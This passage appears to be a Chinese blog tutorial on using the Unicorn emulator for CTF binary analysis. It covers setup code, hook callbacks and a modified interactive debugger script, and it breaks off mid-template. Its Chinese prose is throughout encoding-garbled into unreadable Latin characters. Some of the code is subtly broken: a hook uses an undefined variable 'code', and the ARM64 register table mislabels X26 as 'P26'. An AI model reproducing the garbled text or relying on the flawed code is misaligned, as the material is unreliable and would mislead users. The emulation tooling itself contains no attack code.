*\n```\n\n`unicorn.x86_const`è¿™ä¸ªæ¨¡å—æ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œå¯ä»¥æ¢æˆä»¥ä¸‹å¤šç§æ¶æ„\n\n![image-20211118211823271](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211118211823.png)\n\n### (2)mainå‡½æ•°åˆå§‹åŒ–\n\n```python\nprint(\"Emulate amd64 code\")\nuc = Uc(UC_ARCH_X86, UC_MODE_64)\nbinary = \"./binary\"\n\nBASE = 0\nCODE = BASE + 0x0\nCODE_SIZE = 2 * 1024 * 1024\n\n# mov r8,0x123\n# mov r9,0x456\nCODE_DATA = b\"\\x49\\xc7\\xc0\\x23\\x01\\x00\\x00\" + b\"\\x49\\xc7\\xc1\\x56\\x04\\x00\\x00\"\n#CODE_DATA = getCODEFromBinary(binary)\n\nSTACK = 0x7F00000000\nSTACK_SIZE = 2 * 1024 * 1024\n\nFS = 0x7FF0000000\nFS_SIZE = 0x100000\n\n#åˆå§‹åŒ–UC\ninitUC(uc,CODE,CODE_SIZE, STACK, STACK_SIZE)\n```\n\n`UC_ARCH_X86`ï¼šä»£è¡¨x86æ¶æ„\n\n`UC_MODE_64`ï¼šä»£è¡¨64ä½\n\n`UC_MODE_32`ï¼šä»£è¡¨32ä½\n\n`CODE`ï¼šè¡¨ç¤ºè£…è½½è¿›å…¥å†…å­˜çš„ä»£ç æ•°æ®åœ°å€\n\n`CODE_DATA`ï¼šè¡¨ç¤ºè‡ªå®šä¹‰çš„ä»£ç æˆ–è€…ä»binaryä¸­è·å–çš„ç›¸å…³ä»£ç æ•°æ®\n\n`STACK`ï¼šè¡¨æ ˆçš„æ•°æ®åœ°å€\n\n### (3)å…¶ä»–åˆå§‹åŒ–\n\n#### â‘ å†…å­˜åˆå§‹åŒ–\n\næ ˆå’Œä»£ç æ•°æ®ï¼Œå‘CODEä¸­å†™å…¥CODE_DATA\n\n```python\n# è·å–ä¸€å—å†…å­˜ç”¨æ¥ä¿å­˜ç¨‹åºçš„æ‰€æœ‰æ•°æ®\nuc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL)\nuc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL)\nuc.mem_write(CODE, CODE_DATA)\n```\n\n#### â‘¡å¯„å­˜å™¨åˆå§‹åŒ–\n\nåœ¨initUCä¸­è¢«è°ƒç”¨\n\n```python\ndef initReg(uc,STACK=0x7F00000000,RAX_DATA=0,RBX_DATA=0,\n            RCX_DATA=0,RDX_DATA=0,RSI_DATA=0,\n            RDI_DATA=0,R8_DATA=0,R9_DATA=0,\n            R10_DATA=0,R11_DATA=0,R12_DATA=0,\n            R13_DATA=0,R14_DATA=0,R15_DATA=0):\n    uc.reg_write(UC_X86_REG_RAX, RAX_DATA)\n    uc.reg_write(UC_X86_REG_RBX, RBX_DATA)\n    uc.reg_write(UC_X86_REG_RCX, RCX_DATA)\n    uc.reg_write(UC_X86_REG_RDX, RDX_DATA)\n    uc.reg_write(UC_X86_REG_RSI, RSI_DATA)\n    uc.reg_write(UC_X86_REG_RDI, RDI_DATA)\n    uc.reg_write(UC_X86_REG_R8, R8_DATA)\n    uc.reg_write(UC_X86_REG_R9, R9_DATA)\n    uc.reg_write(UC_X86_REG_R10, R10_DATA)\n    uc.reg_write(UC_X86_REG_R11, R11_DATA)\n    uc.reg_write(UC_X86_REG_R12, R12_DATA)\n    uc.reg_write(UC_X86_REG_R13, R13_DATA)\n    uc.reg_write(UC_X86_REG_R14, R14_DATA)\n    uc.reg_write(UC_X86_REG_R15, R15_DATA)\n    uc.reg_write(UC_X86_REG_RSP, STACK + 0x1000)\n```\n\n### (4)å…¶ä»–å¸¸ç”¨åŠŸèƒ½å‡½æ•°\n\n#### â‘ ä»binaryä¸­è·å–ä»£ç \n\n```python\ndef getCODEFromBinary(binary):\n    with open(binary, \"rb\") as f:\n        CODE_DATA = f.read()\n    return CODE_DATA\n```\n\n#### â‘¡å•æ­¥æ˜¾ç¤ºç»“æœ\n\n```python\ndef hook_OneStep(uc, address, size, user_data):\n    print(\">>> Tracing instruction at 0x%x, instruction size = 0x%x\" %(address, size))\n    #åˆ©ç”¨retæ¥è·³è¿‡printfå‡½æ•°ï¼Œç±»ä¼¼è¿˜å¯ä»¥è·³è¿‡å…¶ä»–å‡½æ•°\n    if address == 0x640:  # printf\n        rsp = uc.reg_read(UC_X86_REG_RSP)\n        retn_addr = u64(uc.mem_read(rsp,8))\n        uc.reg_write(UC_X86_REG_RIP, retn_addr)\n    #è·³è¿‡æŸæ¡æŒ‡ä»¤ï¼Œè¿™é‡Œè·³è¿‡rdrand raxæŒ‡ä»¤\n    if code == b\"\\x48\\x0F\\xC7\\xF0\":\n        uc.reg_write(UC_X86_REG_RIP, address + 4)\n```\n\nç„¶åè¿™ä¸ªéœ€è¦åœ¨ä¹‹ååŠ å…¥åˆ°ucçš„å›è°ƒå‡½æ•°ä¸­ï¼Œä¸€èˆ¬åœ¨mainå‡½æ•°ä¸­æ·»åŠ ï¼Œå¦‚ä¸‹ï¼š\n\n```python\nuc.hook_add(UC_HOOK_CODE, hook_OneStep, None, CODE, len(CODE_DATA))\n```\n\næ·»åŠ hook_OneStepå‡½æ•°ï¼Œä½¿å¾—`CODE~CODE+len(CODE_DATA)`ä¸­æ¯æ¡æŒ‡ä»¤æ‰§è¡Œæ—¶éƒ½è°ƒç”¨è¯¥hook_OneStepå‡½æ•°ï¼Œä¾¿äºæˆ‘ä»¬è§‚å¯Ÿè¿è¡Œè¿‡ç¨‹ã€‚\n\n#### â‘¢æ•´å—æ˜¾ç¤ºç»“æœ\n\n```python\ndef hook_block(uc, address, size, user_data):\n\tprint(\">>> Tracing basic block at 0x%x, block size = 0x%x\" % (address, size))\n```\n\nè¿™ä¸ªä¹Ÿæ˜¯éœ€è¦æ·»åŠ çš„\n\n```python\nuc.hook_add(UC_HOOK_BLOCK, hook_block)\n```\n\næˆ‘ä»¬è¿è¡Œä»£ç å¯ä»¥æ˜¯ä¸€å—ä¸€å—çš„ï¼š\n\n```python\n# è¿è¡Œä¸€æ®µä»£ç \nuc.emu_start(CODE, CODE + 0x7*2)\nuc.emu_start(CODE + 0x7 * 2, CODE + 0x7 * 4)\n```\n\nè¿™ä¸ªæ•´å—çš„blockå‡½æ•°å°±æ˜¯ç”¨åœ¨æ¯å—ä»£ç å¼€å§‹çš„æ—¶å€™è¿è¡Œè¯¥å—å‡½æ•°\n\n#### â‘£æ— æ•ˆå†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°\n\n```python\ndef hook_MemInvalid(uc, access, address, size, value, user_data):\n    if access == UC_MEM_WRITE_UNMAPPED:\n        print(\">>> Missing memory is being WRITE at 0x%x, data size = %u, data value = 0x%x\"%(address, size, value))\n        # map this memory in with 2MB in size\n        uc.mem_map(0xaaaa0000, 2 * 1024*1024)\n        # return True to indicate we want to continue emulation\n        return True\n    else:\n        # return False to indicate we want to stop emulation\n        return False\n\n#uc.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED, hook_MemInvalid)\n```\n\n#### â‘¤å†…å­˜è®¿é—®çš„å›è°ƒå‡½æ•°\n\n```python\ndef hook_MemAccess(uc, access, address, size, value, user_data):\n    if access == UC_MEM_WRITE:\n        print(\">>> Memory is being WRITE at 0x%x, data size = %u, data value = 0x%x\"%(address, size, value))\n    else:   # READ\n        print(\">>> Memory is being READ at 0x%x, data size = %u\"%(address, size))\n\n#uc.hook_add(UC_HOOK_MEM_WRITE, hook_MemAccess)\n#uc.hook_add(UC_HOOK_MEM_READ, hook_MemAccess)\n```\n\n## 2.å¯åŠ¨unicorn\n\né€šå¸¸ä½¿ç”¨å¦‚ä¸‹ä»£ç å¯åŠ¨\n\n```python\ntry:\n    # è¿è¡Œä¸€æ®µä»£ç \n    uc.emu_start(CODE, CODE + 0x7*3)\n    uc.emu_start(CODE + 0x7 * 3, CODE + 0x7 * 4)\nexcept UcError as e:\n    print(\"ERROR: %s\" % e)\n```\n\nè¿™é‡Œå°±ä»£è¡¨è¿è¡Œäº†ä¸¤å—ä»£ç ï¼Œåˆ†åˆ«ä¸º`CODE  ~ CODE + 0x7*3`å’Œ`CODE + 0x7 * 3  ~  CODE + 0x7 * 4`\n\n\n\nå‚è€ƒï¼š\n\n[ä½¿ç”¨unicornæ¥è‡ªåŠ¨åŒ–è§£é¢˜ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/246451)\n\nCTFWIKI\n\n## 3.è°ƒè¯•å™¨\n\n### è¯¦æƒ…å‚è€ƒï¼š\n\n[[åŸåˆ›\\] Unicorn åœ¨ Android çš„åº”ç”¨-Androidå®‰å…¨-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com](https://bbs.pediy.com/thread-253868.htm)\n\nè¿™é‡Œå°†ä¸€äº›ä¸œè¥¿æ”¹äº†ä¸‹ï¼ŒåŸæœ¬[æ— åä¾ å¸ˆå‚…](https://bbs.pediy.com/user-617255.htm)çš„è°ƒè¯•å™¨ä»£ç ä¸­å°±è‡ªå¸¦ä¸åŒARCHå’ŒMODEï¼Œåªä¸è¿‡åˆ†äº«ä¸Šè¿°æ–‡ç« æ—¶ï¼Œæ”¹æ‰äº†åªæœ‰ARMï¼Œè¿™é‡Œæˆ‘åŠ äº†å›å»ï¼Œé¡ºå¸¦åŠ å…¥äº†mipsæ¶æ„ï¼Œå¦å¤–è¿˜åŠ äº†ä¸€äº›ä¸ªäººå¸¸ç”¨çš„å‘½ä»¤ï¼Œå¹¶ä¸”åœ¨linuxä¸‹çš„æŸäº›`\\n`æ¢è¡Œé—®é¢˜(splitå‡½æ•°)ï¼Œè¿™é‡Œä¹Ÿä¸€å¹¶ä¿®æ”¹äº†ã€‚ç„¶åä»ä¸€ä¸ªPWNé€‰æ‰‹çš„è§’åº¦ï¼ŒåŠ äº†ä¸€ç‚¹åŠŸèƒ½ï¼Œè¾“å…¥helpæŸ¥çœ‹æ‰€æœ‰åŠŸèƒ½\n\n#### uniDbg.py\n\n```python\nimport re\n\nfrom unicorn import *\nfrom uniDbg_REG import *\nimport sys\nimport hexdump\nimport capstone as cp\n\nBPT_EXECUTE = 1\nBPT_MEMREAD = 2\nUDBG_MODE_ALL = 1\nUDBG_MODE_FAST = 2\n\n\n\ndef str2int(s):\n    if s.startswith('0x') or s.startswith(\"0X\"):\n        return int(s[2:], 16)\n    return int(s)\n\ndef numToStr(num):\n    amountByte = 0\n    str = \"\"\n    while True:\n        if (num == 0):\n            amountByte = 1\n            break\n        elif (num >= pow(16, amountByte * 2)):\n            amountByte += 1\n            continue\n        else:\n            break\n    for i in range(1, amountByte + 1):\n        newNum = num >> 8\n        myChr = num - newNum * 0x100\n        str += chr(myChr)\n        num = newNum\n    str = ''.join(reversed(str))\n    return str\n\ndef advance_dump(data, base):\n    PY3K = sys.version_info >= (3, 0)\n    generator = hexdump.genchunks(data, 16)\n    retstr = ''\n    for addr, d in enumerate(generator):\n        # 00000000:\n        line = '%08X: ' % (base + addr * 16)\n        # 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00\n        dumpstr = hexdump.dump(d)\n        line += dumpstr[:8 * 3]\n        if len(d) > 8:  # insert separator if needed\n            line += ' ' + dumpstr[8 * 3:]\n        # ................\n        # calculate indentation, which may be different for the last line\n        pad = 2\n        if len(d) < 16:\n            pad += 3 * (16 - len(d))\n        if len(d) <= 8:\n            pad += 1\n        line += ' ' * pad\n\n        for byte in d:\n            # printable ASCII range 0x20 to 0x7E\n            if not PY3K:\n                byte = ord(byte)\n            if 0x20 <= byte <= 0x7E:\n                line += chr(byte)\n            else:\n                line += '.'\n        retstr += line + '\\n'\n    return retstr\n\n\ndef _dbg_trace(mu, address, size, self):\n    self._tracks.append(address)\n    if not self._is_step and self._tmp_bpt == 0:\n        if address not in self._list_bpt:\n            return\n\n    if self._tmp_bpt != address and self._tmp_bpt != 0:\n        return\n\n    return _dbg_trace_internal(mu, address, size, self)\n\n\ndef _dbg_memory(mu, access, address, length, value, self):\n    pc = mu.reg_read(arm_const.UC_ARM_REG_PC)\n    print(\"memory error: pc: %x access: %x address: %x length: %x value: %x\" %\n          (pc, access, address, length, value))\n    _dbg_trace_internal(mu, pc, 4, self)\n    mu.emu_stop()\n    return True\n\n\ndef _dbg_trace_internal(mu, address, size, self):\n    self._is_step = False\n    print(\"======================= Registers =======================\")\n    self.dump_reg()\n    print(\"======================= Disassembly =====================\")\n    self.dump_asm(address, size * self.dis_count)\n\n    while True:\n        raw_command = input(\">\")\n        if raw_command == '':\n            raw_command = self._last_command\n        self._last_command = raw_command\n        command = []\n        for c in raw_command.split():\n            if c != \"\":\n                command.append(c)\n        try:\n            if command[0] == 'set':\n                if command[1] == 'reg':  # set reg regname value\n                    self.write_reg(command[2], str2int(command[3]))\n                elif command[1] == 'bpt':\n                    self.add_bpt(str2int(command[2]))\n                elif command[1].startswith('0x') or command[1].startswith('0X'):\n                    self.write_mem(str2int(command[1]),str2int(command[2]))\n                else:\n                    print(\"[Debugger Error]command error see help.\")\n            elif command[0].startswith('x'):\n                view_amount = int(self.read_ex_viewRow(command[0])[2:],10)\n                if(view_amount == 0):\n                    view_amount = 1\n                read_fmt_str = self.read_ex_last(command[0])\n                if(read_fmt_str == 'gx'):\n                    content = self.read_mem(str2int(command[1]), view_amount * 8)\n                    self.fmt_print_mem(read_fmt_str,str2int(command[1]),content)\n                elif(read_fmt_str == 'wx'):\n                    content = self.read_mem(str2int(command[1]), view_amount * 4)\n                    self.fmt_print_mem(read_fmt_str,str2int(command[1]), content)\n                elif(read_fmt_str == 's'):\n                    content = self.read_mem(str2int(command[1]), view_amount * 32)\n                    self.fmt_print_mem(read_fmt_str,str2int(command[1]), content)\n                elif(read_fmt_str == 'si'):\n                    self.dump_asm(str2int(command[1]), view_amount * self.dis_count)\n\n            elif command[0] == 's' or command[0] == 'step':\n                # self._tmp_bpt = address + size\n                self._tmp_bpt = 0\n                self._is_step = True\n                break\n            elif command[0] == 'n' or command[0] == 'next':\n                self._tmp_bpt = address + size\n                self._is_step = False\n                break\n            elif command[0] == 'r' or command[0] == 'run':\n                self._tmp_bpt = 0\n                self._is_step = False\n                break\n            elif command[0] == 'dump':\n                if len(command) >= 3:\n                    nsize = str2int(command[2])\n                else:\n                    nsize = 4 * 16\n                self.dump_mem(str2int(command[1]), nsize)\n            elif command[0] == 'i' or command[0] == 'info':\n                if command[1] == 'b' or command[1] == 'bpt':\n                    self.list_bpt()\n            elif command[0] == 'd' or command[0] == 'delete':\n                self.del_bpt(str2int(command[1]))\n            elif command[0] == 'stop':\n                break\n            elif command[0] == 't':\n                self._castone = self._capstone_thumb\n                print(\"======================= Disassembly =====================\")\n                self.dump_asm(address, size * self.dis_count)\n            elif command[0] == 'a':\n                self._castone = self._capstone_arm\n                print(\"======================= Disassembly =====================\")\n                self.dump_asm(address, size * self.dis_count)\n            elif command[0] == 'f':\n                print(\" == recent ==\")\n                for i in self._tracks[-10:-1]:\n                    print(self.sym_handler(i))\n            elif command[0] == 'help':\n                self.show_help()\n            elif command[0] == 'context':\n                print(\"======================= Registers =======================\")\n                self.dump_reg()\n                print(\"======================= Disassembly =====================\")\n                self.dump_asm(address, size * self.dis_count)\n            else:\n                print(\"Command Not Found!\")\n\n        except:\n            print(\"[Debugger Error]command error see help.\")\n\n\nclass UnicornDebugger:\n    def __init__(self, mu, mode=UDBG_MODE_ALL):\n        self._ex_seg = re.compile(r'x/\\d+')\n        self._tracks = []\n        self._mu = mu\n        self._arch = mu._arch\n        self._mode = mu._mode\n        self._list_bpt = []\n        self._tmp_bpt = 0\n        self._error = ''\n        self._last_command = ''\n        self.dis_count = 5\n        self._is_step = False\n        self.sym_handler = self._default_sym_handler\n        self._capstone_arch = None\n        self._capstone_mode = None\n\n        # if self._arch != UC_ARCH_ARM:\n        #     mu.emu_stop()\n        #     raise RuntimeError(\"arch:%d is not supported! \" % self._arch)\n        if self._arch == UC_ARCH_ARM:\n            capstone_arch = cp.CS_ARCH_ARM\n        elif self._arch == UC_ARCH_ARM64:\n            capstone_arch = cp.CS_ARCH_ARM64\n        elif self._arch == UC_ARCH_X86:\n            capstone_arch = cp.CS_ARCH_X86\n        elif self._arch == UC_ARCH_MIPS:\n            capstone_arch = cp.CS_ARCH_MIPS\n        else:\n            mu.emu_stop()\n            raise RuntimeError(\"arch:%d is not supported! \" % self._arch)\n\n        if self._mode == UC_MODE_THUMB:\n            capstone_mode = cp.CS_MODE_THUMB\n        elif self._mode == UC_MODE_ARM:\n            capstone_mode = cp.CS_MODE_ARM\n        elif self._mode == UC_MODE_MIPS32:\n            capstone_mode = cp.CS_MODE_MIPS32\n        elif self._mode == UC_MODE_MIPS32 + UC_MODE_BIG_ENDIAN:\n            capstone_mode = cp.CS_MODE_MIPS32 + cp.CS_MODE_BIG_ENDIAN\n        elif self._mode == UC_MODE_MIPS64:\n            capstone_mode = cp.CS_MODE_MIPS64\n        elif self._mode == UC_MODE_MIPS64 + UC_MODE_BIG_ENDIAN:\n            capstone_mode = cp.CS_MODE_MIPS64 + cp.CS_MODE_BIG_ENDIAN\n        elif self._mode == UC_MODE_32:\n            capstone_mode = cp.CS_MODE_32\n        elif self._mode == UC_MODE_64:\n            capstone_mode = cp.CS_MODE_64\n        else:\n            mu.emu_stop()\n            raise RuntimeError(\"mode:%d is not supported! \" % self._mode)\n\n        self._capstone_mode = cp.Cs(capstone_arch, capstone_mode)\n        self._capstone_arch = cp.Cs(capstone_arch, capstone_mode)\n        self._capstone = self._capstone_mode\n\n        if mode == UDBG_MODE_ALL:\n            mu.hook_add(UC_HOOK_CODE, _dbg_trace, self)\n\n        mu.hook_add(UC_HOOK_MEM_UNMAPPED, _dbg_memory, self)\n        mu.hook_add(UC_HOOK_MEM_FETCH_PROT, _dbg_memory, self)\n\n        self._regs = REG_TABLE[self._arch]\n\n    def dump_mem(self, addr, size):\n        data = self._mu.mem_read(addr, size)\n        print(advance_dump(data, addr))\n\n    def dump_asm(self, addr, size):\n        md = self._capstone\n        code = self._mu.mem_read(addr, size)\n        count = 0\n        for ins in md.disasm(code, addr):\n            if count >= self.dis_count:\n                break\n            print(\"%s:\\t%s\\t%s\" % (self.sym_handler(ins.address), ins.mnemonic, ins.op_str))\n\n    def dump_reg(self):\n        result_format = \"\"\n        count = 0\n        for rid in self._regs:\n            rname = self._regs[rid]\n            value = self._mu.reg_read(rid)\n            if count < 4:\n                result_format = result_format + rname + '=' + hex(value) + '\\t'\n                count += 1\n            else:\n                count = 1\n                result_format += '\\n' + rname + '=' + hex(value) + '\\t'\n        print(result_format)\n\n    def write_reg(self, reg_name, value):\n        for rid in self._regs:\n            rname = self._regs[rid]\n            if rname == reg_name:\n                self._mu.reg_write(rid, value)\n                return\n        print(\"[Debugger Error] Reg not found:%s \" % reg_name)\n\n    def write_mem(self,addr,value):\n        str = numToStr(value)\n        self._mu.mem_write(addr,str.encode('UTF-8'))\n        return\n\n    def read_mem(self,addr,length):\n        str = self._mu.mem_read(addr,length)\n        return str\n\n    def show_help(self):\n        help_info = \"\"\"\n        # commands\n        # set reg <regname> <value>\n        # set bpt <addr>\n        # n[ext]\n        # s[etp]\n        # r[un]\n        # dump <addr> <size>\n        # i[nfo] b[pt]\n        # d[elete] <bpt_Idx>\n        # stop\n        # a/t change arm/thumb\n        # f show ins flow\n        # x/<rowAmount><gx/s/si/wx>\n        \"\"\"\n        print(help_info)\n\n    def list_bpt(self):\n        for idx in range(len(self._list_bpt)):\n            print(\"[%d] %s\" % (idx, self.sym_handler(self._list_bpt[idx])))\n\n    def add_bpt(self, addr):\n        self._list_bpt.append(addr)\n\n    def del_bpt(self, idx):\n        del self._list_bpt[idx]\n        #self._list_bpt.remove(addr)\n\n    def get_tracks(self):\n        for i in self._tracks[-100:-1]:\n            # print (self.sym_handler(i))\n            pass\n        return self._tracks\n\n    def _default_sym_handler(self, address):\n        return hex(address)\n\n    def set_symbol_name_handler(self, handler):\n        self.sym_handler = handler\n\n    def read_ex_viewRow(self,str):\n        return self._ex_seg.findall(str)[0]\n\n    def read_ex_last(self,str):\n        return self._ex_seg.sub('',str)\n\n    def fmt_print_mem(self,fmt_str,addr,content):\n        if(self._mode >= UC_MODE_BIG_ENDIAN):\n            ending = 'big'\n        else:\n            ending = 'little'\n        count = 0\n        while(count < len(content)):\n            if(fmt_str == 'gx'):\n                print(\"0x{:0>16x}\\t0x{:0>16x}\\t0x{:0>16x}\".format(addr,int.from_bytes(content[0+count:8+count],byteorder = ending),\n                      int.from_bytes(content[8+count:16+count],byteorder = ending)))\n                count += 8\n            elif(fmt_str == 'wx'):\n                print(\"0x{:0>8x}\\t0x{:0>8x}\\t0x{:0>8x}\".format(addr,int.from_bytes(content[0+count:4+count],byteorder = ending),\n                      int.from_bytes(content[4+count:8+count],byteorder = ending)))\n                count += 4\n            elif(fmt_str == 's'):\n                print(\"0x{:0>16x}\\t{:>32s}\".format(addr,numToStr(int.from_bytes(content[0+count:32+count],byteorder = ending))))\n                count += 32\n```\n\n#### uniDbg_REG.py\n\n```python\nfrom unicorn import *\n\nREG_ARM = {arm_const.UC_ARM_REG_R0: \"R0\",\n           arm_const.UC_ARM_REG_R1: \"R1\",\n           arm_const.UC_ARM_REG_R2: \"R2\",\n           arm_const.UC_ARM_REG_R3: \"R3\",\n           arm_const.UC_ARM_REG_R4: \"R4\",\n           arm_const.UC_ARM_REG_R5: \"R5\",\n           arm_const.UC_ARM_REG_R6: \"R6\",\n           arm_const.UC_ARM_REG_R7: \"R7\",\n           arm_const.UC_ARM_REG_R8: \"R8\",\n           arm_const.UC_ARM_REG_R9: \"R9\",\n           arm_const.UC_ARM_REG_R10: \"R10\",\n           arm_const.UC_ARM_REG_R11: \"R11\",\n           arm_const.UC_ARM_REG_R12: \"R12\",\n           arm_const.UC_ARM_REG_R13: \"R13\",\n           arm_const.UC_ARM_REG_R14: \"R14\",\n           arm_const.UC_ARM_REG_R15: \"R15\",\n           arm_const.UC_ARM_REG_PC: \"PC\",\n           arm_const.UC_ARM_REG_SP: \"SP\",\n           arm_const.UC_ARM_REG_LR: \"LR\"\n           }\n\nREG_ARM64 = {arm64_const.UC_ARM64_REG_X0: \"X0\",\n            arm64_const.UC_ARM64_REG_X1: \"X1\",\n            arm64_const.UC_ARM64_REG_X2: \"X2\",\n            arm64_const.UC_ARM64_REG_X3: \"X3\",\n            arm64_const.UC_ARM64_REG_X4: \"X4\",\n            arm64_const.UC_ARM64_REG_X5: \"X5\",\n            arm64_const.UC_ARM64_REG_X6: \"X6\",\n            arm64_const.UC_ARM64_REG_X7: \"X7\",\n            arm64_const.UC_ARM64_REG_X8: \"X8\",\n            arm64_const.UC_ARM64_REG_X9: \"X9\",\n            arm64_const.UC_ARM64_REG_X10: \"X10\",\n            arm64_const.UC_ARM64_REG_X11: \"X11\",\n            arm64_const.UC_ARM64_REG_X12: \"X12\",\n            arm64_const.UC_ARM64_REG_X13: \"X13\",\n            arm64_const.UC_ARM64_REG_X14: \"X14\",\n            arm64_const.UC_ARM64_REG_X15: \"X15\",\n            arm64_const.UC_ARM64_REG_X16: \"X16\",\n            arm64_const.UC_ARM64_REG_X17: \"X17\",\n            arm64_const.UC_ARM64_REG_X18: \"X18\",\n            arm64_const.UC_ARM64_REG_X19: \"X19\",\n            arm64_const.UC_ARM64_REG_X20: \"X20\",\n            arm64_const.UC_ARM64_REG_X21: \"X21\",\n            arm64_const.UC_ARM64_REG_X22: \"X22\",\n            arm64_const.UC_ARM64_REG_X23: \"X23\",\n            arm64_const.UC_ARM64_REG_X24: \"X24\",\n            arm64_const.UC_ARM64_REG_X25: \"X25\",\n            arm64_const.UC_ARM64_REG_X26: \"P26\",\n            arm64_const.UC_ARM64_REG_X27: \"X27\",\n            arm64_const.UC_ARM64_REG_X28: \"X28\",\n            arm64_const.UC_ARM64_REG_X29: \"X29\",\n            arm64_const.UC_ARM64_REG_SP: \"SP\",\n            arm64_const.UC_ARM64_REG_PC: \"PC\",\n           }\n\n\nREG_AMD64 = {x86_const.UC_X86_REG_RAX: \"RAX\",\n             x86_const.UC_X86_REG_RBX: \"RBX\",\n             x86_const.UC_X86_REG_RCX: \"RCX\",\n             x86_const.UC_X86_REG_RDX: \"RDX\",\n             x86_const.UC_X86_REG_RDI: \"RDI\",\n             x86_const.UC_X86_REG_RSI: \"RSI\",\n             x86_const.UC_X86_REG_R8: \"R8\",\n             x86_const.UC_X86_REG_R9: \"R9\",\n             x86_const.UC_X86_REG_R10: \"R10\",\n             x86_const.UC_X86_REG_R11: \"R11\",\n             x86_const.UC_X86_REG_R12: \"R12\",\n             x86_const.UC_X86_REG_R13: \"R13\",\n             x86_const.UC_X86_REG_R14: \"R14\",\n             x86_const.UC_X86_REG_R15: \"R15\",\n             x86_const.UC_X86_REG_RBP: \"RBP\",\n             x86_const.UC_X86_REG_RSP: \"RSP\",\n             x86_const.UC_X86_REG_RIP: \"RIP\",\n             }\n\nREG_MIPS = {\n    mips_const.UC_MIPS_REG_ZERO: \"ZERO\",\n    mips_const.UC_MIPS_REG_V0: \"V0\",\n    mips_const.UC_MIPS_REG_V1: \"V1\",\n    mips_const.UC_MIPS_REG_AT: \"AT\",\n    mips_const.UC_MIPS_REG_A0: \"A0\",\n    mips_const.UC_MIPS_REG_A1: \"A1\",\n    mips_const.UC_MIPS_REG_A2: \"A2\",\n    mips_const.UC_MIPS_REG_A3: \"A3\",\n    mips_const.UC_MIPS_REG_T0: \"T0\",\n    mips_const.UC_MIPS_REG_T1: \"T1\",\n    mips_const.UC_MIPS_REG_T2: \"T2\",\n    mips_const.UC_MIPS_REG_T3: \"T3\",\n    mips_const.UC_MIPS_REG_T4: \"T4\",\n    mips_const.UC_MIPS_REG_T5: \"T5\",\n    mips_const.UC_MIPS_REG_T6: \"T6\",\n    mips_const.UC_MIPS_REG_T7: \"T7\",\n    mips_const.UC_MIPS_REG_S0: \"S0\",\n    mips_const.UC_MIPS_REG_S1: \"S1\",\n    mips_const.UC_MIPS_REG_S2: \"S2\",\n    mips_const.UC_MIPS_REG_S3: \"S3\",\n    mips_const.UC_MIPS_REG_S4: \"S4\",\n    mips_const.UC_MIPS_REG_S5: \"S5\",\n    mips_const.UC_MIPS_REG_S6: \"S6\",\n    mips_const.UC_MIPS_REG_S7: \"S7\",\n    mips_const.UC_MIPS_REG_T8: \"T8\",\n    mips_const.UC_MIPS_REG_T9: \"T9\",\n    mips_const.UC_MIPS_REG_GP: \"GP\",\n    mips_const.UC_MIPS_REG_SP: \"SP\",\n    mips_const.UC_MIPS_REG_FP: \"FP\",\n    mips_const.UC_MIPS_REG_RA: \"RA\",\n             }\n\n\nREG_TABLE = {UC_ARCH_ARM: REG_ARM, UC_ARCH_X86: REG_AMD64,UC_ARCH_MIPS: REG_MIPS,UC_ARCH_ARM64:REG_ARM64}\n```\n\n### ä½¿ç”¨æ–¹æ³•ï¼š\n\n```python\nTHUMB = asm('''\n    mov rax,0x10\n    mov rdx,0x20\n    ''')\nADDRESS = 0x10000\n#æ³¨æ„å¤§ç«¯åºçš„è¯éœ€è¦åŠ ä¸Šè®¾ç½®æˆUC_MODE_64+UC_MODE_BIG_ENDIAN\nmu = Uc(UC_ARCH_X86, UC_MODE_64)\nmu.mem_map(ADDRESS, 2 * 0x10000)\nmu.mem_write(ADDRESS, THUMB)\n\n#debugger attach\n#éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªéœ€è¦æ”¾åœ¨hookå‡½æ•°ä¹‹å‰æ‰è¡Œï¼Œä¸ç„¶å¯èƒ½å‡ºç°ä¸€äº›æ„æƒ³ä¸åˆ°çš„é”™è¯¯\nudbg = UnicornDebugger(mu)\nudbg.add_bpt(ADDRESS)\n\n# emulate machine code in infinite time\nmu.emu_start(ADDRESS, ADDRESS + len(THUMB))\n```\n\nè°ƒè¯•èµ·æ¥ä¹‹åï¼Œè¾“å…¥helpè·å–ç›¸å…³çš„å‘½ä»¤ä¿¡æ¯\n\n![image-20220221185425958](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202211854104.png)\n\n### æ·»åŠ å‘½ä»¤ï¼š\n\nå…¶å®[æ— åä¾ å¸ˆå‚…](https://bbs.pediy.com/user-617255.htm)çš„æ¨¡æ¿å·²ç»å†™å¾—æŒºå¥½äº†ï¼Œæˆ‘ä»¬åªè¦å¾€ä¸ŠåŠ å°±è¡Œäº†ï¼Œä¸»è¦è¿˜æ˜¯è®¾ç½®`UnicornDebugger`è¿™ä¸ªç±»ï¼Œåœ¨ä¸­æ–­å¤„ç†è¿™é‡Œæ·»åŠ å‘½ä»¤\n\n![image-20220221185630168](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202211856245.png)\n\n\n\n## 4.æ¨¡æ¿\n\næˆ‘ä»¬ç”¨unicornè¿˜æ˜¯ä½¿ç”¨æ¨¡æ¿æ¥è¿›è¡Œè°ƒè¯•æ›´å¥½ï¼Œè¿™æ ·èƒ½åŠ å¿«åˆ†æçš„é€Ÿåº¦ï¼Œè¿™é‡Œå°±ç»™å‡ºè‡ªå·±çš„ä¸€ä¸ªå¸¸ç”¨æ¨¡æ¿\n\n```python\n# -*- coding:UTF-8 -*-\nfrom __future__ import print_function\nfrom pwn import*\nfrom unicorn import *\nfrom unicorn.x86_const import *\nfrom unicornDbg import uniDbg\nimport ipdb\n\ncontext.arch = 'amd64'\n\ndef hook_OneStep(uc, address, size, user_data):\n    #print(\">>> Tracing instruction at 0x%x, instruction size = 0x%x\" % (address, size))\n    # 